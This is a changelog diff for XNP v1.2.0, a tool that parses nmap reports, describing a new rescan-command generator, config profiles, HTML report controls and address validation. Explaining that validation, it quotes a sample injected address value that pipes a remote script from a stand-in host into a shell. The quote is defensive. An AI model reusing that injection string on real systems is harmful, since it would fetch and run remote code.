@@ -6,6 +6,45 @@ Released versions of [XNP](https://github.com/xtormin/XtremeNmapParser).
 
 ## XNP v1.2.0 — the HTML report
 
+- **New `--rescan`: the nmap command for the next pass, built from what this one
+  found.** A finished scan already knows which hosts are up and which ports they
+  have open, so `xnp -d nmap/ --rescan` prints the commands that aim at exactly
+  that instead of sweeping whole hosts again. Because nmap applies one port list
+  to every target of an invocation, hosts are grouped **by port signature**:
+  those whose open ports are the same set share a command, and no host is ever
+  sent a port it does not have. The port list, the scan types and `-6` are
+  decided per group, so a UDP group gets `-sU` and `U:` prefixes, a mixed group
+  also gets an explicit TCP type (without one, nmap ignores the `T:` half), and
+  a TCP-only group is left to nmap's own default unless the profile asked for
+  one. `--rescan-args="…"` replaces the arguments outright. The commands go to
+  stderr, so stdout stays the clean list of generated paths.
+- The profiles live in `config.yaml` under a new `rescan:` block — `service`,
+  `vuln`, `recheck` and `full` ship with it, and one added in
+  `config/config.yaml` joins them rather than replacing the block. `states`
+  there decides which port states are worth aiming at; it includes
+  `open|filtered` by default, which is the normal state of a UDP port and
+  exactly what a short second pass settles.
+- **The report's `nmap` button now produces commands that work.** It used to
+  emit a single cartesian line — every port of the group against every host of
+  the group — which probed ports most of those hosts did not have, and it
+  ignored the protocol entirely, so a UDP group came out with no `-sU` and its
+  ports mislabelled as TCP. It now runs the same generator as `--rescan`.
+- **A rescan control in the toolbar of the Services and Data tabs**, beside
+  each tab's existing hand-off button, with a profile selector filled from your
+  `config.yaml` and a free-text box for arguments typed by hand. It copies the
+  commands for the current selection — everything, or whatever the filter has
+  left — and the count in the label follows the filter live, so you can see
+  that `service:ssh` collapses seven commands into one before you click.
+- **The query-language help is behind an info button** next to *Clear*, instead
+  of holding a paragraph under the search bar on every tab for ever. The choice
+  is remembered.
+- The footer links to the project on GitHub.
+- Addresses are validated before they reach a command line. `addr` is CDATA in
+  `nmap.dtd`, so a report claiming `addr="10.0.0.1; curl evil.sh|sh"` is a valid
+  one — and these commands are meant to be pasted into a shell. Anything that is
+  not an IP address is dropped rather than escaped, on both the Python and the
+  JavaScript side.
+
 - **A directory run now merges and descends by default.** `xnp -d nmap/` is the
   whole command: `-M` and `-R` are no longer needed (they still parse, so
   existing scripts keep working), and the new `--no-merger` / `--no-recursive`
